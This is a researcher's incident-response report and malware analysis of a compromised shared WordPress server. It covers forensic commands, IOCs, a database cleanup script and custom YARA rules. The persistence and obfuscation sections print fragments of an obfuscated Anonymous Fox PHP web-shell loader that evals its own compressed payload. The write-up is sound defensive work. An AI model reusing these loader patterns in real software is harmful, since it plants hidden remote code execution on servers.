docs.title: Home
docs.text:
Cybersecurity Research • Incident Response

Welcome to my research site.

This repository contains technical write-ups from incident response engagements, malware analysis, vulnerability research, and defensive security tooling. My goal is to document real-world investigations, share detection techniques, and contribute practical knowledge to the security community.

If I have made any mistakes, or you are able to offer advice or improvements, please contact me.

docs.title: Disclaimer
docs.text:
The information published on this site is intended for educational and defensive cybersecurity purposes only.

Any malware samples, indicators of compromise (IOCs), detection rules, or techniques discussed are shared to improve detection, analysis, and incident response capabilities. Sensitive client information has been removed or anonymized where appropriate.

docs.title: Overview
docs.text:
The following report is a condensed write-up regarding an incident response on a compromised server I was tasked with securing after the fact. A shared-hosting web server managed via cPanel/WHM, hosting multiple WordPress sites across several accounts, was identified as compromised. Indicators point to a multi-account breach involving server-side web shells and large-scale content injection.

The malware found was not detected by using any AV scans or security plugins, but through manual investigation, regex patterns and YARA rules. All connections to the compromised server was done through my own private VPN connection to hide my own public IP address as an extra precaution. I intentionally excluded some discoveries from this write-up for brevity, but I will share the most interesting ones.

Some of the findings include: - Polymorphic instances of Anonymous Fox suite - GSocket RAT (Remote Access Trojan) binary - Corrupted php.ini files - Corrupted .htaccess files - Web Shells with GET parameters for shell execution - Emails sent by the attackers through the mail server

Although the most interesting malware I found was the polymorphic Anonymous Fox instances, I did also find a lot of other malware. Honestly, it looked like this web server was compromised by more than one group of attackers. I state this as the patterns and languages varied amongst the samples I found.

The investigation prioritised, in order: evidence preservation, assessment of live attacker activity, containment, and root-cause identification.

Shout out to the following researchers who's content made this possible: John Strand, Low Level, Hack The Clown, John Hammond, Nahamsec, Tomnomnom

Disclaimer: Both Gemini 3.1 Pro and Claude Opus 4.8 were used to assist me in the investigation. The AI models were used to help me with research on discoveries made and to support me with additional commands I used to discover anomalies.

See the companion Malware Analysis for breakdown of the shell's obfuscation mechanisms.

docs.title: Introduction
docs.text:
The client contacted me, explaining that his server (which I had not seen before) had been 'hacked'. This server hosts about 30 different wordpress websites and upon loading certain features, the user would be redirected to https://ushort.dev and other similar URLs.

I intentionally left out some parts of this investigation to prevent a bloated blog. But one of the early actions I took when accessing the server via SSH was to grep for the ushort string in the webroot of one of the affected sites to see what files come up. This only reveal temporary logs from cPanel based on actions already taken by the user which is what lead me to take a different approach.

docs.title: Environment
docs.text: Item Detail Operating System AlmaLinux 9.8 (Olive Jaguar) Hosting Model Shared hosting, multiple cPanel accounts Application WordPress (mixed cored and plugin versions across sites)

docs.title: Log analysis
docs.text:
The WHM management interface allowed me to view active processes and network logs. The active processes and first view logs did not reveal anything. When looking through the Daily Process Log in WHM, I saw a sudden spike (23%) in the previous day's (June 18 2026) memory usage. This memory usage came from the httpd process. Now 23% is not much for a web server but when compared to the current day (0.3%) it seemed very odd.

I then looked at the bandwidth usage for each month by site. This then revealed a massive amount of data usage for about 7 sites. As the sites are not hosting video content or image downloads, this seemed strange so I jumped back many months until I saw a drop in bandwidth usage. I discovered that prior to February 2026, the average bandwidth usage was between 7GB to 9GB but in February there was an additional 20GB. Looking through the other months, the maximum usage for one particular site was 32.26GB.

Upon further investigation, I found that the most targeted file in the requests sent was xmlrpc.php, about 100,000+ requests within a 3 month span. I remember from the past that this was a known vulnerable file. I did a quick search and discovered that this legacy file has been used in past exploits to brute force user accounts. This is what I believe was used to brute-force user accounts and gain access to file upload capabilities through an administrator account.

docs.title: Looking For Established Connections and Odd User Accounts
docs.text:
Before continuing, I told myself not to underestimate the attackers and be sure of my next actions. The next thing I was using the Terminal function in WHM to get a root shell. I then ran the following commands to check for strange user accounts. 

# Find user accounts with bash shell access
grep "/bin/bash" /etc/passwd
sort -n -t: /etc/passwd | grep -vE "nologin|noshell|false|halt|shutdown|sync"

# This shows the last authenticated SSH logins
last

# Check if the user creation is in the root's bash history
grep "USERNAME" ~/.bash_history

I found a user that stood out to me. I then found the user creation command in the root user's bash history account. The bash history had unix timestamps enabled and that user was created (according to the history timestamp) a minute before two other accounts which I know to be official. But when looking at last command's output, I enumerated their IP address with ip-api.com JSON API which showed me the user was connecting from a static IP in Washington DC. I have my own alias on my host system to quickly enumerate an IP address: 

enum_ip() {
    ip_address=$1
    curl -s "http://ip-api.com/json/$ip_address?fields=66846719" | jq
}

None of the official users were in the USA so I flagged it and confirmed with my client. No one to his knowledge was operating out of the States. I didn't take any action on the user account yet as I wanted to script the removal of any connections and user accounts to prevent any counter attacks should the attackers be actively monitoring such actions.

I then looked at all the processes and their child processes but this didn't reveal anything interesting. But the active network connections showed ESTABLISHED connections to foreign IP addresses (listed under 'Attacker IPs'). I found active connections on port 111 and immediately killed the process and masked the service. 

# Processes and there child processes
ps -auxf

# All open files showing process IDs and Connection status - Credit: John Strand
lsof -i -P
I then went back to the WHM interface and wanted to check the firewall settings. I found that the firewall was in 'debug' mode and wasn't active. As this was a local server hosting to only local companies and clients, I thought that I should geo-lock the server to disconnect any foreign clients immediately making it easier to work on and clean up.

I then added the geo-lock and locked some of the ports I saw which were open and added the global xmlrpc deny rule, and blocked and removed the strange SSH user account. Now I bought myself some time to dig... and dig I did :D

docs.title: Finding Persistence
docs.text:
I checked the active connections again and saw that the only active connection were mine and the hosting provider. I then explained to Claude my findings and actions, and prompted it to help give me places to look for any malicious scripts based on the current evidences.

The focus then turned to the /home directory and Claude gave me the following line: 

stat /home/user/public_html/shell.php

My first thought was "who would be stupid enough to leave a malicious script on a server named script.php?". I laughed and said to myself, "What the hell, let's just see what comes up" 

# Find all the files under the /home directory named script
find /home -name "script.php" > script_file_find_output.txt
So I looked at the output and about the 10th line down, one line immediately stood out: /home/REDACTED/cpmove.psql.1312886056/teaniou/ytdkrwn/iazvlpc/shell.php This did not look normal but rather looked like an attempt to make it look like a temporary path of sorts or was a randomly generated path. I then opened it up with vi and had a look...

At this point my heart started racing with excitement, I'm sure we all know the feeling. This is what I saw: 

<?php
$JIzk='file_ge'.'t'.'content'.'s';$YrdE='gzu'.'ncomp'.'ress';$esyt='s'.'ubs'.'tr';$DPAQ='st'.'r'.''.'re'.'place';$TprW='e'.'xit';eval($YrdE($DPAQ('xpkzchjbsq','>',$DPAQ('qpfxhbaelk','<',$esyt($JIzk( _FILE_ ),-217718)))));$TprW(0);
?>

BOOM! Text book obfuscation, great. I then went back to my text file and looked for more paths like it and found another 3 of them: /home/REDACTED/public_html/images/npmrlch/cywartd/vjaqbug/shell.php /home/REDACTED/public_html/modules/mod_login/elhywdo/cuywi1b/bwsax1e/shell.php /home/REDACTED/public_html/images/sfvratq/heyxoca/pvynrqk/shell.php

In each of them I saw the obfuscation was slightly different and the variable names were completely different everytime but still easy enough to read but one thing stood out amongst them all (__FILE__),-OFFSET I then asked Claude to give me the best way to find all of these files across the file system using this regex \( __FILE__ \),-[0-9]+

In hind sight, this was not the best way to find them but it worked. 

# Find all the php files with this pattern in them under first all the webroot folders then the filesystem
grep -rnP '\( __FILE__ \),-[0-9]+' --include="*.php" /home/*/public_html/ >> possible_malware.txt
grep -rnP '\( __FILE__ \),-[0-9]+' --include="*.php" / >> possible_malware.txt

# Using some vi magic, I quickly got a unique list
:%!sort -u
I started with only the webroots but after seeing how quickly it output results outside of what I had already found, I then switched to the root filesystem. A few minutes later, I sat with a 216 unique instances across the file system.

See the companion Malware Analysis for breakdown of the shell's obfuscation mechanisms.

docs.title: Cleaning Up The Database
docs.text:
The next thing I had to check were the database tables. The following tables were found to have the ushort redirects in them:

  • wp-posts
  • wp-options

In wp-options the home column had a ushort link in it, redirecting any visitor to the phising site. A custom bash script was used to clean up all the database entries.

All this script did was to use the wp cli tool to clean up the tables, but this was not perfect and did not catch everything. I would later create another bash script that iterates through each table and column to find these patterns and flush them out. 

#!/usr/bin/bash
WP_CLI="/usr/local/bin/wp"
REGEX_META='<meta http-equiv="refresh" content="0; url=https?:\/\/ushort\.[a-z]+\/[a-zA-Z0-9]+" \/>\s*'
REGEX_SCRIPT='<script>window\.location\.href = "https?:\/\/ushort\.[a-z]+\/[a-zA-Z0-9]+";<\/script>\s*'

declare -A SEEN

for user in $(ls -1 /var/cpanel/users | grep -v system); do
  for user_file in /var/cpanel/userdata/$user/*; do
    # only JSON cache files parse; skip YAML/_SSL silently
    jq -e . "$user_file" >/dev/null 2>&1 || continue
    DOCROOT=$(jq -r '.documentroot // empty' "$user_file" 2>/dev/null)
    PHP_VER=$(jq -r '.phpversion // empty'   "$user_file" 2>/dev/null)
    [[ -z "$DOCROOT" || -z "$PHP_VER" ]] && continue
    [[ -n "${SEEN[$DOCROOT]}" ]] && continue          # dedupe docroots
    SEEN[$DOCROOT]=1

    PHP_CLI="/opt/cpanel/$PHP_VER/root/usr/bin/php"
    RUN="sudo -u $user /bin/bash -c"

    # skip non-WP docroots silently
    $RUN "$PHP_CLI $WP_CLI core is-installed --path='$DOCROOT'" 2>/dev/null || continue

    meta=$($RUN "$PHP_CLI $WP_CLI search-replace '$REGEX_META' '' --path='$DOCROOT' --regex --regex-flags='i'" 2>/dev/null \
           | grep -oiP 'Success:.*?\K\d+')
    scr=$($RUN  "$PHP_CLI $WP_CLI search-replace '$REGEX_SCRIPT' '' --path='$DOCROOT' --regex --regex-flags='i'" 2>/dev/null \
           | grep -oiP 'Success:.*?\K\d+')

    # ground truth: distinct infected post rows
    PREFIX=$($RUN "$PHP_CLI $WP_CLI config get table_prefix --path='$DOCROOT'" 2>/dev/null)
    rows=$($RUN "$PHP_CLI $WP_CLI db query \"SELECT COUNT(*) FROM ${PREFIX}posts WHERE post_content LIKE '%ushort.%'\" --skip-column-names --path='$DOCROOT'" 2>/dev/null)

    printf '%-12s %-40s META=%-5s SCRIPT=%-5s ROWS=%s\n' \
           "$user" "$DOCROOT" "${meta:-0}" "${scr:-0}" "${rows:-0}"
  done
done

docs.title: End of the First Day...
docs.text:
At this point it was about 4AM and had to get ready for my day job. I compiled my hours, findings and report and sent it to the client. I did not include all the details of the entire investigation but tried to give the highlights of the juicy bits. Hopefully this helps others to find the IOCs and stop any future or existing compromises.

But wait... there is more to come. In the very near future I will share the additional days of this investigation.

docs.title: MITRE ATT&CK Mapping
docs.text: Tactic Technique ID Technique Name Notes Persistence T1505.003 Server Software Component: Web Shell Primary persistence mechanism Defense Evasion T1027 Obfuscated Files or Information Polymorphic / multi-layered compression and encoding Execution T1059.004 Unix Shell Command execution via shell Discovery T1083 File and Directory Discovery Filesystem enumeration post-compromise Defense Evasion T1140 Deobfuscate/Decode Files or Information Runtime eval chain decoding obfuscated payload Command and Control T1095 Non-Application Layer Protocol Reverse shell using raw socket to bypass inbound firewall rules Command and Control T1090 Proxy Traffic routed through intermediary nodes (Linode instances) Command and Control T1571 Non-Standard Port C2 callback observed on non-standard port Defense Evasion T1070.004 Indicator Removal on Host: File Deletion The malware compiled and deleted it's source code Discovery T1049 System Network Connections Discovery Mapped out active network interfaces and connections Discovery T1016 System Network Configuration Discovery Identified listening services and established connections Discovery T1018 Remote System Discovery DNS zone enumeration via /etc/named.conf mapped all domains on shared host Credential Access T1552.001 Unsecured Credentials: Credentials In Files Malware harvested DB credentials from CMS config files across accounts Command and Control T1219 Remote Access Software GSocket RAT binary dropped for persistent remote access Command and Control T1105 Ingress Tool Transfer GSocket RAT binary transferred to compromised host filesystem

docs.title: Indicators of Compromise
docs.text: Danger - High Confidence The regex pattern and redirect domain family are the most reliable cross-environment detections. Attacker IPs are cloud/VPS infrastructure and will rotate.

docs.title: Network
docs.text: Type Value Context Domain pattern ushort\.[a-z]+ Phishing redirect destination — TLDs observed: .dev, .today, .observer, .company, .com Port 111 (RPC) Active ESTABLISHED connections to foreign IPs observed on this port Infrastructure Linode ASN (multiple IPs) Attacker C2 relay nodes — see Attacker IPs C2 https://t.me/F0x_CyberSecurity Telegram channel embedded in Anonymous Fox malware dictionary C2 URL https://u-fox.link Anonymous Fox panel URL found in malware strings

docs.title: File System
docs.text:
Note Hash-based detection is unreliable — the polymorphic shells rewrite themselves on each execution. Use the regex pattern and structural markers instead.

Type Value Context Regex \( __FILE__ \),-[0-9]+ Detects all variants of the self-referencing payload loader Path pattern /public_html/[a-z]{6,8}/[a-z]{6,8}/[a-z]{6,8}/(index\|shell\|tool).php Randomly nested 3-level directories with generic filenames File .htaccess modified AddType text/plain .php and Options Indexes FollowSymLinks injected File php.ini modified safe_mode = Off, disable_functions = NONE, open_basedir = OFF injected Directory .F0x/ Attacker staging directory — see Attacker Base Directory Marker file foxnoindex.htm / foxnoindex.html Anonymous Fox custom DirectoryIndex marker

"Detection Commands" 

# Find all shell variants across web roots
grep -rnP '\( __FILE__ \),-[0-9]+' --include="*.php" /home/*/public_html/

# Find corrupted .htaccess files
grep -rl "AddType text/plain .php" /home/*/public_html/

# Find corrupted php.ini files
grep -rl "disable_functions = NONE" /home/*/public_html/

docs.title: Web Application / Database
docs.text:
Type Value Context DB payload — meta <meta http-equiv="refresh" content="0; url=https?://ushort\.[a-z]+/..."> Injected into wp_posts.post_content and wp_options.home DB payload — script <script>window.location.href = "https?://ushort\.[a-z]+/...";</script> Second variant — both present per infected row Impact scale 216 PHP shells · 17,560 infected PHP files · 818+ infected DB rows on one account alone Scale across 30+ hosted WordPress sites

"Detection Query (WP-CLI)" 

# Count infected post rows
wp db query "SELECT COUNT(*) FROM wp_posts WHERE post_content LIKE '%ushort.%'" --path=/path/to/wp

# Check if wp_options home is hijacked
wp option get home --path=/path/to/wp

docs.title: Behavioral
docs.text: Signal Detail Bandwidth spike ~8 GB/month baseline → 20–32 GB/month from February 2026 xmlrpc.php volume 100,000+ requests over 3 months — brute-force credential attack vector Self-modifying PHP files PHP files overwriting themselves on disk each request Unauthorized SSH account Created seconds before known-legitimate accounts, connecting from foreign static IP httpd memory spike 23% spike on day of attacker activity vs 0.3% current baseline

docs.title: Remediation
docs.text:
• Authored a WP-CLI script to enumerate and (on live pass) remove the ushort.* redirect payloads across hosted WordPress installations, producing per-account counts of meta, script, and distinct infected rows.
  • Block attacker IP(s); disable compromised accounts; remove live phishing/shell pages once evidence was preserved.
  • Firewall enabled and ports locked down.
  • Global rule to disable xmlrpc.php
  • Changing of all passwords for user accounts, databases and administrative accounts
  • Disabled C Compiler access - this was enabled for unpriviledged users - WHM setting
  • Shell fork bomb protection enabled - WHM setting
  • Wrote custom YARA rules

docs.title: Commands Used
docs.text:
# These were used to find the web shell - I found 216 malicious scripts with this same pattern scattered through out all the server accounts
grep -rnP '\( __FILE__ \),-[0-9]+' --include="*.php" /home/*/public_html/
grep -rnP --binary-files=text '\( __FILE__ \),-[0-9]+' --include="*.php" /home/*/public_html/

# Find files that used the same obfuscated PHP concatenation pattern
grep -rnP "\\\$[A-Za-z0-9_]{1,32}\s*=\s*('[A-Za-z0-9_]+'\s*\.\s*){1,}'[A-Za-z0-9_]+'\s*;" --include="*.php" /home/*/public_html/
grep -rnP "\\\$[A-Za-z0-9_]{1,32}\s*=\s*('[A-Za-z0-9_]+'\s*\.\s*){1,}'[A-Za-z0-9_]+'\s*;" --include="*.php" /

# Look for any suspicious shell sessions and from which IP they originate 
last
# Check if the suspcious username appears in the bash history
grep "USERNAME" ~/.bash_history
# Decode the unix timestamp in .bash_history
date -d @1782931826

# Find world writable directories on the system - possible places to find foreign files
find / -xdev -perm /1000 -type d
# Find executable files within the world writable directories
find /dev/shm /tmp/ /var/tmp -type f -executable
# Find immutable files - Attackers like to try and prevent their scripts to be deleted
find / -type f -exec lsattr {} \; 2>/dev/null | grep -- '-i-'

# Look for orphaned files - There were some files that attempted to look like kernal processes
# Remember that most of these files may be legit, but look for anything that stands out
lsof +L1
lsof +L1 | grep -vE "shm|memfd"
lsof | grep del | grep -Ev 'tmp|memfd'
lsof | grep del | grep -Ev 'tmp|memfd|/run/'
# Recover an orphaned file - not always FD 4 but have a look
cp /proc/PID/fd/4 /tmp/recovered_file
cat /tmp/recovered_file

# Looks for user space executables that appear to be a kernel space process
for p in /proc/[0-9]*; do 
    name=$(tr -d '\0' < "$p/comm" 2>/dev/null) 
    exe=$(readlink "$p/exe" 2>/dev/null) 
    if [[ "$name" == \[* && -n "$exe" ]]; then 
    echo "IMPOSTOR: pid=${p#/proc/} comm=$name exe=$exe uid=$(awk '/^Uid:/{print $2}' $p/status)" 
    fi 
done

# Find files modified since the date provided
# The ctime is an important flag to set as (to my knowledge) an attacker can't change the actual birth time of the file 
find /home /var/www -type f -name '*.ph*' -newerct '2026-06-01' -printf '%c %p\n' 2>/dev/null | sort

# Look at the birth, access, modify and change timestamps on a file
stat /path/to/file

# Look for unusual files with the SUID bit set
find / -uid 0 –perm -4000 –print
# Look for files with dots and spaces in the name (found quiet a few)
find / -name " " –print
find / -name ".. " –print
find / -name ". " –print
find / -name " " –print

# Yara classic and Yara-X commands when I built my own custom rules for this environment
yara -r scan RULE_FILE /home
yara -r scan RULE_FILE /home | tee -a ./files_to_check

yr scan -r RULE_FILE /home
yr scan -r RULE_FILE /home | tee -a ./files_to_check

# Use the package manager to do a package integrity check
rpm –Va | sort

# Look for any unusual network connections
lsof -i -P
lsof -p PID
# Look for any unusual parent and child processes
ps auxf
# Look for unusual arp resolutions
arp -a

# Check system-wide cron jobs
cat /etc/crontab
ls /etc/cron.*

# Find all user accounts with shell access
grep "/bin/bash" /etc/passwd
cat /etc/passwd | grep -vE "nologin|false|sync"
sort -n -t: /etc/passwd | grep -vE "nologin|noshell|false|halt|shutdown|sync"

docs.title: Custom YARA Rules (Using Yara-X)
docs.text: Should someone be able to improve on the YARA rules below, please let me know. I built my own YARA rule for what I found because I didn't yet find anything for Anonymous Fox, but if there is something, again let me know.

docs.title: Detect_AnonFoxPHP.yar
docs.text:
rule Detect_AnonFoxPHP {
    meta:
        description = "PHP Compressed Anon Fox Payload"
        author = "8iker_4n0n"
        severity = "Critical"
        reference_pattern = "( __FILE__ ),-[0-9]+"

    strings:
        $pattern = /\( *__FILE__ *\),-[0-9]+/ ascii
        $zlib1 = { 78 01 }
        $zlib2 = { 78 9C }
        $zlib3 = { 78 DA }

    condition:
        uint8(0) == 0x3C and uint8(1) == 0x3F and
        $pattern and 
        $zlib1 in (@pattern..@pattern + 1000) or
        $zlib2 in (@pattern..@pattern + 1000) or
        $zlib3 in (@pattern..@pattern + 1000)
}

rule AnonymousFox_PHP_Webshell {
    meta:
        description = "Detects Anonymous Fox polymorphic PHP web shell family"
        author      = "8iker_4n0n"
        date        = "2026-06-27"
    strings:
        $self_ref     = /\(\s*__FILE__\s*\),\s*-[0-9]+/ ascii
        $str_corrupt  = /str_replace\('[a-z]{10}','[<>]'/ ascii
        $disable_log  = "ini_set('error_log', NULL)" ascii
        $gz_chain     = /gzu(ncompress|inflate)\s*\(/ ascii
        $error_off    = "error_reporting(0)" ascii
    condition:
        $self_ref and $str_corrupt and 2 of ($disable_log, $gz_chain, $error_off)
}

docs.title: Detect_ObfuscatedCodePHP
docs.text:
rule Detect_ObfuscatedCode {
    meta:
        author      = "8iker_4n0n"
        description = "Find common concatenation obfuscated code"
    strings:
        $pattern = /\$[A-Za-z0-9_]{1,32}\s*=\s*('[A-Za-z0-9_]+'\s*\.\s*){1,}'[A-Za-z0-9_]+'\s*/ ascii
    condition:
        $pattern
}

docs.title: Detect_GSocket_Shell
docs.text:
rule Detect_GSocket_Webshell {
    meta:
        author      = "8iker_4n0n"
        description = "Detect possible GSocket Webshell"
        severity = "Critical"
    strings:
        $pattern = "/usr/bin/pkill -0" base64
    condition:
        $pattern
}

docs.title: Detect_UShortLinks
docs.text:
rule Detect_UShortLinks {
        meta:
                author = "8iker_4n0n"
                description = "Find Ushort links in files"
        strings:
                $pattern = /ushort\.[a-z]+/ nocase

                $php1 = "<?php" nocase
                $php2 = "<?="

                $html1 = "<html" nocase
                $html2 = "<body" nocase
                $html3 = "<!DOCTYPE" nocase

        condition:
                (any of ($php*) or any of ($html*)) and $pattern
}

docs.title: Polymorphic Web Shell (Anonymous Fox) — Malware Analysis
docs.text: This is the technical malware analysis companion to the Incident Response report.

docs.title: Overview
docs.text:
The following is my own write up on malware found inside of a compromised server in June 2026. I will share commands and scripts I used and what I saw inside the malware. I hope that this assists those that face similar situations and increases the awareness of techniques used by bad actors. The primary malware found is called Anonymous Fox which is not only a webshell but a suite of hacking commands with a UI interface.

As always, I am willing to learn so if I made mistakes or you can help improve the blog post or offer advice, I am all ears. We are always learning and improving.

Disclaimer: Gemini 3.1 Pro, Claude Opus 4.8 and Perplexity were used to assist with the analysis of the malware and additional research where needed.

docs.title: Malware Summary
docs.text:
Note: Currently I am only sharing the first script I reversed, I will soon add to this blog, the other malware.

During the reversing of the shell script found, I found a ton of other little demons for persistence. I also found malware by what looks like completely different authors as the patterns were completely different.

What was found: - Corrupted php.ini files - Corrupted .htaccess files - Web Shells with GET parameters for shell execution - GUI Web Shell and Hacking Tool Suite - GSocket RAT binary - Emails sent by the attackers through the mail server

docs.title: Obfuscation Chain(s)
docs.text:
The expansion below is taken from the analysis and decoding of one file (shell.php) which seems to be the main webshell. Each file found pretty much starts in the same way, minus a few changes in the string concatenation obfuscation. After the first decompression, each file has a slightly different obfuscation chain and different variable labels. All the scripts had the same patterns of randomness, disabled logging and errors, and specific markers which made it detectable.

All analysis was done in a Remnux Air-Gapped VM. Only static analysis was used through out the decoding.

[!info] All payloads shown in the code blocks are truncated as much as possible for brevity without eliminating too much detail.

Chains found:

strrev -> rot13 -> b64  -> gz
rot13  -> strrev -> b64 -> gz
b64    -> rot13  -> gz  -> rev
b64    -> rot13  -> gz_raw -> strrev
b64    -> strrev -> gz_raw -> rot13
b64    -> strrev -> rot13  -> gz_raw
strrev -> gz     -> rot13  -> b64
strrev -> b64    -> gz_raw
b64    -> strrev -> rot13
b64    -> rot13  -> gz
b64    -> gz
strrev -> b64
b64    -> strrev
rot13  -> b64

goto hGlCI; PeQag: $oc_I9 = 'base64_decode'; goto r8GNW; pk4Pp: $ASGyM = '_HvMU'; goto PeQag; hGlCI: function ho5PK($waFGk) { goto sh800; BCXNt: $waFGk = substr($waFGk, (int) hex2bin('30'), (int) hex2bin('2d333735')); goto mzMhr; mzMhr: return $waFGk; goto VZWAQ; sh800: $waFGk = substr($waFGk, (int) hex2bin('353330')); goto BCXNt; VZWAQ: } goto pk4Pp; r8GNW: function wFyG7($u0AVI) { goto wWgLF; tcdv_: global $oc_I9; goto AotMy; wWgLF: global $ASGyM; goto tcdv_; AotMy: return strrev(gzinflate($oc_I9(HO5PK($u0AVI)))); goto K8JNk; K8JNk: } function iWWkp($rl0mE) { goto aIrap; G9DKq: $vYlUH = ''; goto TpvQ1; LGGeU: F92gP: goto gAB8j; aIrap: $pjSF6 = strlen(trim($rl0mE)); goto G9DKq; DccGv: if (!($Jl2YQ < $pjSF6)) { goto sUKes; } goto BLN7e; AhDPz: return $vYlUH; goto iJcek; TpvQ1: $Jl2YQ = 0; goto AyBMt; pLYaY: goto deo_6; goto lZEcs; BLN7e: $vYlUH .= pack("C", hexdec(substr($rl0mE, $Jl2YQ, 2))); goto LGGeU; gAB8j: $Jl2YQ += 2; goto pLYaY; AyBMt: deo_6: goto DccGv; lZEcs: sUKes: goto AhDPz; iJcek: } goto r88SS; r88SS: eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(WFYg7('bAdNSBwm4ZTSFO
To be honest, I struggled with this one. The whole thing is littered with goto spaghetti which made it a little bit difficult to follow, if someone has experience in this area, please do contact me as I would love to understand this better. So when I saw this, I immediately thought about x86 programming and how labels work, which apparently it kinda is like that with PHP (didn't know that we could use labels in PHP before this). Anyways, we can see and follow a few things which will help us deconstruct it a bit. The way you see the notes taken is how I started to deconstruct it, I looked for the definitions of the function that is taking the base64 payload as an argument.

First definitions: - ho5PK function is defined with the hGlCI label - $oc_I9 is defined as a global variable with the PeQag label - PeQag == base64_decode - $ASGyM is defined as a global variable with the pk4Pp label but is never used (dead end) - pk4Pp == _HvMU We can see that there is some substr inception happening here with: - BCXNt: $waFGk = substr($waFGk, (int) hex2bin('30'), (int) hex2bin('2d333735')); - sh800: $waFGk = substr($waFGk, (int) hex2bin('353330')); - 353330 == 530, 30 == 0, 2d333735 == -375 - the $waFGk value is being stripped of 530 characters at the front and 375 at the end - the variable $waFGk is just a placeholder defined by the ho5PK function, the actual variable being used is $u0AVI - the variable $u0AVI is also just a placeholder defined by the wFyG7 function, the actual value is the base64 payload We can see the parts of the chain: - AotMy: return strrev(gzinflace($oc_I9(HO5PK($u0AVI)))); # this is a small part of the bigger function below - hGlCI: function ho5PK($waFGk) { got sh800; BCXNt: $waFGk = substr($waFGk, (int) hex2bin('30'), (int) hex2bin('2d333735'));} - r8GNW: function wFyG7($u0AVI) { goto wWgLF; tcdv_: global $oc_I9; goto AotMy; wWgLF: global $ASGyM; goto tcdv_; AotMy: return strrev(gzinflate($oc_I9(HO5PK($u0AVI)))); got K8JNk; K8JNk: }

If we flatten out the functions, it makes more sense: 

<?php
// sh800 -> BCXNt -> return $waFGk
hGlCI: function ho5PK($waFGk) { 
    goto sh800; 
    BCXNt: $waFGk = substr($waFGk, (int) hex2bin('30'), (int) hex2bin('2d333735')); // called second 
    goto mzMhr; 
    mzMhr: return $waFGk; 
    goto VZWAQ; 
    sh800: $waFGk = substr($waFGk, (int) hex2bin('353330')); // called first
    goto BCXNt; 
    VZWAQ: // this is as good as return, it is the end of the function
}

r8GNW: function wFyG7($u0AVI) { 
    goto wWgLF; // Get the unused variable fluff $ASGyM
    tcdv_: global $oc_I9;
    goto AotMy; // do the actual work
    wWgLF: global $ASGyM; 
    goto tcdv_; 
    AotMy: return strrev(gzinflate($oc_I9(HO5PK($u0AVI)))); // actual return
    goto K8JNk; 
    K8JNk: // fluff
}

// separated just to highlight the actual work
AotMy: return strrev(gzinflate($oc_I9(HO5PK($u0AVI)))); // ho5PK -> base64_decode -> gzinflate -> strrev

So we see the WFYg7 function is being called on the base64 string so we can assume it takes base64 as input. According to our deconstruction above, we know: - WFYg7 == wFyG7 && HO5PK == ho5PK - WFYg7 takes in a single argument - WFYg7 is called through the invocation of the r8GNW label - hGlCI label defines the ho5PK function with $waFGk as the argument - $waFGk and $u0AVI are just placeholders used to confuse us from the actual value being used -> the base64 string So the final chain is as follows: - ho5PK(PAYLOAD) -> strips 530 chars from the beginning of the base64 and 375 from the end of the string - base64_decode(PAYLOAD) -> decodes the payload - gzinflate(B64_BYTES) -> Decompresses the base64 payload's raw bytes - strrev(DECOMPRESSED_BYTES) -> reverses the bytes

Even though we could see this, the extraction of the payload in this layer failed. I then took a screenshot of the code you see in the first code block and explained the situation to Gemini. Gemini then gave me the solution to brute force the trim padding on the payload, which then worked to extract the next layer.

So with this layer we see the iwwkp function being called with some sort of hex value but no definition...until we go back to the previous layer. If we flatten out the iwwkp function we see:

    goto BLN7e;

    goto pLYaY; // check if the (!(count < stringLength)) again
    AyBMt: deo_6: goto DccGv;

So we can see that the function does the following: - Takes the base64 payload as input - Get the string length of the payload - Adds goto jumps to create a loop to iterate over the input string - Defines an empty string which is prepended to - Increments a counter by 2 which is used as the string index - If the counter is NOT less than the string length, return the full string created

If you have ever built loops in Assembly, this type of logic should be pretty straight forward but let's understand what the BLN7e line is actually doing: 

<?php
// Let's take the first hex byte of the input string '65'
// The "C" in the pack method is defined as an unsigned char (8-bit / 1 byte)
// In ASCII, 65 => A
echo "Pack: " . pack("C", 65) . "\n"; // Pack: A

// If we convert hex 65 to decimal, we get 101
echo "Hex 2 Dec: " . hexdec(65) . "\n"; // 101

// 101 in decimal on the ASCII table is 'e'
echo "Hex 2 Dec Pack: " . pack("C", hexdec(65)) . "\n"; // Hex 2 Dec Pack: e 

// Syntax of substr
// substr(INPUT, INDEX, TRIM)
// We know that strings are essentially just an array of chars, therefore we can grab values at certain indexes
substr($input_string, $idx, 2); // take the $input_string value, go to the index defined in $idx, grab me 2 chars
So this is pretty much a printf statement in C: 
#include<stdio.h>

int main(void) {
    printf("Decimal to char: %c\n", 101); // Decimal to char e
}
So we are converting the hex value to a plaintext string.

But let's rewrite this a bit to make it clearer: 

function iwwkp($hex_string) {
    $length = strlen(trim($hex_string));
    $idx = 0;
    $final_output = '';

    for ($idx = 0; $idx < $length; $idx += 2) { // we move idx by two each iteration so that we always get a hex byte to read
        if (!($idx < $length)) { return $final_output; } // same as DccGv
        $final_output .= pack("C", hexdec(substr($hex_string, $idx, 2))); // same as BLN7e
        //echo "Current: $final_output\n";
    }
}

.$_POST[$GLOBALS[¸][0x00020]].$GLOBALS[¸][0x000026] .hk40u);goto trZt6;EYQ9L:goto i2t // .... and a ton more
So the first thing we see are their own definitions of functions should they not exist on the server where this exists. This is handy if you ever need it for any project in the future but anyways.

We clearly have the following: - A weird character defined as a global variable (define) - The character translates to c2b8 in hex => 49848 in decimal - That same character is used as an index for the $GLOBALS array - Some garbage characters that need to be stripped off (0x0a, -8 in the substr arguments) - There is a delimiter consisting of pipe symbols | and non-printable control characters in between them - |^C|^D|^C - There is some interesting hexadecimal notation used to reference the elements in the $GLOBALS array

So when I looked the the compressed data inside of the substr method, I honestly couldn't see the delimiters. But we definitely know they are there due to the explode() function call. As stated above, we did notice the substr function and we can see that the malware author's are pulling the payload from the 0x0a index till -8. Since 0x0a is 10 in decimal, we know they are stripping the first 10 bytes and the -8 bytes from the end of the payload.

So let's have a look at those bytes. I copied out the first few important lines into a temporary file and piped it to xxd: 

# If we count 10 bytes after the single quote, we can see that the first actual byte is '0a'
00000000: 6572 726f 725f 7265 706f 7274 696e 6728  error_reporting(
00000010: 455f 414c 4c5e 455f 4e4f 5449 4345 293b  E_ALL^E_NOTICE);
00000020: 6465 6669 6e65 2827 c2b8 272c 2027 c38f  define('..', '..
00000030: c3bd c2a7 2729 3b24 474c 4f42 414c 535b  ....');$GLOBALS[
00000040: c2b8 5d20 3d20 6578 706c 6f64 6528 277c  ..] = explode('|
